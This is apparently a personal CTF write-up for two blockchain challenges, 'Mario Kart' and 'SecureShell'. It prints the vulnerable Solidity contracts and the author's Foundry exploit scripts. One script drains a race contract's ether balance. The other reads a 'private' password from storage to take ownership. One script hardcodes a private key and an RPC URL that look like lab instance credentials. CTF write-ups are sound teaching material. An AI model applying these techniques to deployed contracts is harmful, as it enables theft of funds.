---
description: >-
  Here are the write-ups for blockchain challenges that I solved during the
  competition
icon: hive
---

# Blockchain

## Challenge 1: Mario Kart

### Overview

**Description:** Vrooom vroom Mario!!!

Challenge Link: https://github.com/AliffZulhelmi/umcs-challenges/blob/main/mario\_player.zip

The challenge provides a zip file containing a solidity file(.sol).

The first file is **Setup.sol** - This file is used to initialize our main contract and define the conditions for a successful exploit.

The second file is **MarioKart.sol** - This is the main contract file. This smart contract is the actual vulnerable contract that we have to exploit or solve. In this case, **MarioKart.sol** was the game logic contract with a race.

Setup.sol:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./MarioKart.sol";

contract Setup {
    MarioKart public marioKart;
    address public deployer;
    bool public challengeSolved;

    constructor() payable {
        require(msg.value == 20 ether, "Setup needs 20 ether");
        deployer = msg.sender;
        marioKart = new MarioKart{value: 20 ether}();
        marioKart.enableSpecialItems();
    }

    function isSolved() public view returns (bool) {
        return address(marioKart).balance == 0;
    }

    function getMainContract() public view returns (address) {
        return address(marioKart);
    }
}
```

MarioKart.sol

```solidity
pragma solidity ^0.8.15;

contract MarioKart {
    struct Racer {
        string character;
        uint position;
        uint speed;
        bool hasItem;
        bool finished;
    }

    address public gameOwner;
    bool public raceStarted;
    bool public raceFinished;
    address[] public players;
    mapping(address => Racer) public racers;
    mapping(uint => address) public rankings;
    uint public finisherCount;
    uint public raceDistance = 1000;
    uint public constant ENTRY_FEE = 1 ether;
    
 
    uint public constant MUSHROOM_PRICE = 0.1 ether;
    uint public constant STAR_PRICE = 0.5 ether;
    bool public specialItemsEnabled;
    
    event RacerJoined(address player, string character);
    event RaceStarted();
    event RacerMoved(address player, uint newPosition);
    event ItemUsed(address player, address target);
    event RacerFinished(address player, uint rank);
    event RaceFinished();
    event PrizeAwarded(address winner, uint amount);
    event PowerUpPurchased(address player, string powerType);

    constructor() payable {
        require(msg.value == 20 ether, "Must initialize with 20 ether");
        gameOwner = msg.sender;
        raceStarted = false;
        raceFinished = false;
        finisherCount = 0;
        specialItemsEnabled = false; 
    }

    function joinRace(string memory character) external payable {
        require(!raceStarted, "Race already started");
        require(racers[msg.sender].position == 0, "Already joined race");
        require(msg.value == ENTRY_FEE, "Must pay 1 ether to join");
        
        racers[msg.sender] = Racer({
            character: character,
            position: 0,
            speed: 10,
            hasItem: false,
            finished: false
        });
        
        players.push(msg.sender);
        emit RacerJoined(msg.sender, character);
    }

    function startRace() external {
        require(!raceStarted, "Race already started");
        raceStarted = true;
        emit RaceStarted();
    }
    
    function enableSpecialItems() external {
        specialItemsEnabled = true;
    }

    function accelerate() external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        Racer storage racer = racers[msg.sender];
        racer.position += racer.speed;
        
        if (!racer.hasItem && uint(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 5 == 0) {
            racer.hasItem = true;
        }
        
        emit RacerMoved(msg.sender, racer.position);
        
        if (racer.position >= raceDistance) {
            racer.finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }

    function useItem(address target) external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        require(racers[msg.sender].hasItem, "No item to use");
        require(racers[target].position > 0, "Target not in race");
        require(!racers[target].finished, "Target already finished");
        
        racers[target].speed = racers[target].speed > 5 ? racers[target].speed - 5 : 1;
        racers[msg.sender].hasItem = false;
        
        emit ItemUsed(msg.sender, target);
    }

    function boost() external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].speed += 5;
        
        racers[msg.sender].position += racers[msg.sender].speed;
        racers[msg.sender].speed -= 5;
        
        emit RacerMoved(msg.sender, racers[msg.sender].position);
        
        if (racers[msg.sender].position >= raceDistance) {
            racers[msg.sender].finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }
    
    function buyMushroomPowerup() external payable {
        require(specialItemsEnabled, "Special items not enabled");
        require(msg.value == MUSHROOM_PRICE, "Must pay 0.1 ether for Mushroom");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].position += 50;
        
        emit PowerUpPurchased(msg.sender, "Mushroom");
        
        if (racers[msg.sender].position >= raceDistance) {
            racers[msg.sender].finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }
    
    function buyStarPowerup() external payable {
        require(specialItemsEnabled, "Special items not enabled");
        require(msg.value == STAR_PRICE, "Must pay 0.5 ether for Star");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].speed += 20;
        
        emit PowerUpPurchased(msg.sender, "Star");
    }

    function getRacerPosition(address player) external view returns (uint) {
        return racers[player].position;
    }

    function getRacerSpeed(address player) external view returns (uint) {
        return racers[player].speed;
    }

    function getRacerHasItem(address player) external view returns (bool) {
        return racers[player].hasItem;
    }

    function getPlayerCount() external view returns (uint) {
        return players.length;
    }

    function getRacerCharacter(address player) external view returns (string memory) {
        return racers[player].character;
    }

    function getRacer(address player) external view returns (Racer memory) {
        return racers[player];
    }

    function getLeaderboard() external view returns (address[] memory) {
        address[] memory leaderboard = new address[](finisherCount);
        for (uint i = 0; i < finisherCount; i++) {
            leaderboard[i] = rankings[i];
        }
        return leaderboard;
    }

    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }
    
    function getSpecialItemsEnabled() external view returns (bool) {
        return specialItemsEnabled;
    }
} 
```

**Brief Explanation Of Both Contracts**

**Setup.sol**

This contract import the main contract(MarioKart.sol). During initialization, this contract require 20ETH to be sent during deployment and then stores the deployer's address. New main contract(MarioKart) will be created and forwards the 20ETH to it. **isSolved()** function explain the conditions to win this challenge. For this setup, we need to drain contract balance to 0.

**MarioKart.sol**

This main contract contain the game logic, functions, and values that need to be exploited. For this contract, players are required to pay 1ETH to join the race via **joinRace()**. Each player needs to select character, and starts at pos. 0. The default speed is 10 unit/move. Race Distance condition, be the first to reach at finish line (1000 units).

Roughly the flow should look like this

Join Race \[joinRace()] > Start Race\[startRace()] > Move Forward \[accelerate()] > Use Items \[useItem(target)] > Boost\[boost()] > Finish Race

From the contract, we can identify multiple special items such as Mushroom, costs 0.1ETH (Instanly move player +50 Unit) and Star cost 0.5 ETH(Permanently increase speed by +20 units).

The first player to finish gets the entire contract balance, initial 20ETH + entry free.

**Strategy - Win The Race, Transfer entire balance to us, and claim the flag**

### Solution

I used [Foundryup](https://github.com/foundry-rs/foundry/blob/master/foundryup/README.md), which is a toolchain for blockchain and even for blockchain CTF challenges.

1. Create a project of our challenge using this command

```
forge init umcs-mariokart // forge init <project_name>
```

2. Copy or move both of the contracts inside /src folder.
3. Craft our exploit inside /script folder.
4. Running the exploit inside /scriptfolder

```
PRIVATE_KEY=<private-key> forge script script/MarioKartSolu
tion.sol:MarioKartSolution --broadcast -vvvv
```

MarioKartSolution.sol

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IMarioKart {
    function joinRace(string memory character) external payable;
    function startRace() external;
    function buyMushroomPowerup() external payable;
    function buyStarPowerup() external payable;
    function boost() external;
    function accelerate() external;
    function getRacerPosition(address player) external view returns (uint);
    function getRacerSpeed(address player) external view returns (uint);
    function getRacerHasItem(address player) external view returns (bool);
    function getContractBalance() external view returns (uint);
}

interface ISetup {
    function getMainContract() external view returns (address);
    function isSolved() external view returns (bool);
}

contract MarioKartSolution is Script {
    // Hardcoded blockchain information
    address constant SETUP_ADDRESS = <setup_addr>;
    string constant RPC_URL = "<rpc_url>";
    uint256 constant PRIV_KEY = <private-key>;
    address constant PLAYER_ADDRESS = <player_wallet_address>;
    
    function run() external {
        // Create VM instance
        vm.createSelectFork(RPC_URL);
        
        // Initialize contracts
        ISetup setup = ISetup(SETUP_ADDRESS);
        IMarioKart marioKart = IMarioKart(setup.getMainContract());
        
        console.log("=== MarioKart CTF Solution ===");
        console.log("Initial contract balance:", marioKart.getContractBalance() / 1e18, "ETH");
        
        // Start broadcasting with the private key
        vm.startBroadcast(PRIV_KEY);
        
        // Step 1: Join the race (1 ETH)
        console.log("\n[1/6] Joining race...");
        marioKart.joinRace{value: 1 ether}("Luigi");
        console.log("- Joined race as 'Luigi'");
        
        // Step 2: Start the race
        console.log("\n[2/6] Starting race...");
        marioKart.startRace();
        console.log("- Race started!");
        
        // Step 3: Buy Mushroom powerup (0.1 ETH)
        console.log("\n[3/6] Buying Mushroom powerup...");
        marioKart.buyMushroomPowerup{value: 0.1 ether}();
        logRacerStatus(marioKart);
        
        // Step 4: Buy Star powerup (0.5 ETH)
        console.log("\n[4/6] Buying Star powerup...");
        marioKart.buyStarPowerup{value: 0.5 ether}();
        logRacerStatus(marioKart);
        
        // Step 5: Use boost
        console.log("\n[5/6] Using boost...");
        marioKart.boost();
        logRacerStatus(marioKart);
        
        // Step 6: Accelerate until we win
        console.log("\n[6/6] Accelerating to finish line...");
        uint accelerationCount = 0;
        uint maxAttempts = 30;
        
        while (marioKart.getRacerPosition(PLAYER_ADDRESS) < 1000 && accelerationCount < maxAttempts) {
            marioKart.accelerate();
            accelerationCount++;
            
            uint position = marioKart.getRacerPosition(PLAYER_ADDRESS);
            console.log("- Acceleration %d: Position = %d, Speed = %d", 
                      accelerationCount, 
                      position,
                      marioKart.getRacerSpeed(PLAYER_ADDRESS));
            
            if (position >= 1000) {
                console.log("!!! RACE FINISHED IN POSITION 1 !!!");
                break;
            }
            
            // Small delay to avoid potential RPC rate limiting
            vm.roll(block.number + 1);
        }
        
        // Final status check
        console.log("\n=== Final Status ===");
        logRacerStatus(marioKart);
        console.log("Contract balance:", marioKart.getContractBalance() / 1e18, "ETH");
        console.log("Challenge solved:", setup.isSolved());
        
        if (!setup.isSolved()) {
            console.log("\n!!! WARNING: Challenge not solved yet !!!");
            console.log("Possible issues:");
            console.log("- Not enough accelerations (try increasing maxAttempts)");
            console.log("- Another player finished first");
            console.log("- Insufficient funds for transactions");
        }
        
        vm.stopBroadcast();
    }
    
    function logRacerStatus(IMarioKart marioKart) internal view {
        console.log("- Current position:", marioKart.getRacerPosition(PLAYER_ADDRESS));
        console.log("- Current speed:", marioKart.getRacerSpeed(PLAYER_ADDRESS));
        console.log("- Has item:", marioKart.getRacerHasItem(PLAYER_ADDRESS) ? "Yes" : "No");
    }
}





// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IMarioKart {
    function joinRace(string memory character) external payable;
    function startRace() external;
    function buyMushroomPowerup() external payable;
    function buyStarPowerup() external payable;
    function boost() external;
    function accelerate() external;
    function getRacerPosition(address player) external view returns (uint);
    function getRacerSpeed(address player) external view returns (uint);
    function getContractBalance() external view returns (uint);
    function getPlayerCount() external view returns (uint);
}

interface ISetup {
    function getMainContract() external view returns (address);
    function isSolved() external view returns (bool);
}

contract MarioKartSolution is Script {
    address constant SETUP_ADDRESS = 0x2Ec2C3c7540fC4f52bC666298Fd3D093ADa78903;
    string constant RPC_URL = "http://116.203.176.73:4447/846aac61-77b6-46bf-a106-23b907145cc2";
    uint256 constant PRIV_KEY = 363d23b42bd48ef35c014b5f624a82df662485501cab38c9ac9f3738fd19b815;
    address constant PLAYER_ADDRESS = 0x4849D1E009b3bfc1422823bE6e70B2a010063FF9;
    
    function run() external {
        vm.createSelectFork(RPC_URL);
        ISetup setup = ISetup(SETUP_ADDRESS);
        IMarioKart marioKart = IMarioKart(setup.getMainContract());
        
        console.log("=== MarioKart CTF Solution ===");
        console.log("Initial contract balance:", marioKart.getContractBalance() / 1e18, "ETH");
        console.log("Players in race:", marioKart.getPlayerCount());
        
        vm.startBroadcast(PRIV_KEY);
        
        // 1. Join race (1 ETH)
        console.log("\n[1] Joining race...");
        marioKart.joinRace{value: 1 ether}("Hacker");
        console.log("- Joined as 'Hacker'");
        
        // 2. Start race
        console.log("\n[2] Starting race...");
        marioKart.startRace();
        console.log("- Race started!");
        
        // 3. Buy powerups
        console.log("\n[3] Buying powerups...");
        marioKart.buyMushroomPowerup{value: 0.1 ether}(); // +50 position
        marioKart.buyStarPowerup{value: 0.5 ether}(); // +20 speed
        console.log("- Powerups purchased");
        
        // 4. Boost
        console.log("\n[4] Boosting...");
        marioKart.boost();
        uint position = marioKart.getRacerPosition(PLAYER_ADDRESS);
        console.log("- Current position:", position);
        
        // 5. Accelerate to win
        console.log("\n[5] Accelerating to finish line...");
        uint requiredAccelerations = (1000 - position) / marioKart.getRacerSpeed(PLAYER_ADDRESS) + 1;
        
        for (uint i = 0; i < requiredAccelerations; i++) {
            marioKart.accelerate();
            position = marioKart.getRacerPosition(PLAYER_ADDRESS);
            console.log("- Accel %d: Pos=%d Speed=%d", i+1, position, marioKart.getRacerSpeed(PLAYER_ADDRESS));
            
            if (position >= 1000) {
                console.log("!!! FINISHED RACE !!!");
                break;
            }
        }
        
        // Final check
        console.log("\n=== Final Status ===");
        console.log("Position:", position);
        console.log("Contract balance:", marioKart.getContractBalance() / 1e18, "ETH");
        console.log("Challenge solved:", setup.isSolved());
        
        vm.stopBroadcast();
    }
}
```

Challenge Solved - ![](<../.gitbook/assets/image (75).png>)



## Challenge 2: SecureShell

### Overview

**Description:** Super secure shell :)

**Challenge Link:** [**https://github.com/AliffZulhelmi/umcs-challenges/blob/main/ParticipantsSecureShell.zip**](https://github.com/AliffZulhelmi/umcs-challenges/blob/main/ParticipantsSecureShell.zip)

SecureShell contract has an owner and a secret password. Our goal is to call **Setup.isSolved()**, which the condition is to check **secureShell.owner() = msg.sender.**

The only way to change the owner is via **SecureShell.changeOwner(uint256 \_password, address \_newOwner)**, which requires knowing the correct **secretPassword** (a uint256 value set during deployment).

**Setup.sol:**&#x20;

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./SecureShell.sol";

contract Setup {
    SecureShell public secureShell;

    constructor(uint256 _password) {
        secureShell = new SecureShell(_password);
    }

    function isSolved() public view returns (bool) {
        return secureShell.owner() == msg.sender;
    }
}
```

**SecureShellExploit.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract SecureShell {
    address public owner;
    uint256 private secretPassword;
    uint256 public accessLevel;
    uint256 public securityPatches;
    
    constructor(uint256 _password) {
        owner = msg.sender;
        secretPassword = _password;
        accessLevel = 0;
        securityPatches = 0;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    function changeOwner(uint256 _password, address _newOwner) public {
        require(_password == secretPassword, "Incorrect password");
        owner = _newOwner;
    }
    
    function requestAccess(uint256 _accessCode) public returns (bool) {
        if (_accessCode == 31337) {
            accessLevel++;
            return true;
        } else {
            return false;
        }
    }
    
    function pingServer() public view returns (uint256) {
        return uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 1000;
    }
    
    function updateSecurity() public onlyOwner {
        securityPatches++;
    }
}
```

### Solution

**Strategy:** Extract **secretPassword** from deployed **SecureShell** contract > Call **changeOwner(secretPassword, myWallet)** so we can become the new owner > **Setup.isSolved()** to check if we succeed or not.

```
forge script script/SecureShellExploit.sol --rpc-url <rpc_url> --private-key <private_key> --broadcast
```

**SecureShellExploit.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Script.sol";

interface ISecureShell {
function changeOwner(uint256 _password, address _newOwner) external;
function owner() external view returns (address);
}

interface ISetup {
function isSolved() external view returns (bool);
function secureShell() external view returns (address);
}

contract SecureShellExploit is Script {
address constant SETUP_CONTRACT = <setup_addr>;
address constant WALLET = <wallet_addr>;
function run() external {
    vm.startBroadcast();

    // Use interface to fetch secureShell contract
    address secureShell = ISetup(SETUP_CONTRACT).secureShell();

    // Read private password from slot 1
    bytes32 pwBytes = vm.load(secureShell, bytes32(uint256(1)));
    uint256 password = uint256(pwBytes);
    console2.log("Extracted password:", password);

    // Change ownership to our wallet
    ISecureShell(secureShell).changeOwner(password, WALLET);

    // Verify success
    require(ISetup(SETUP_CONTRACT).isSolved(), "Exploit failed");
    console2.log("Exploit succeeded!");

    vm.stopBroadcast();
}
}
```

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
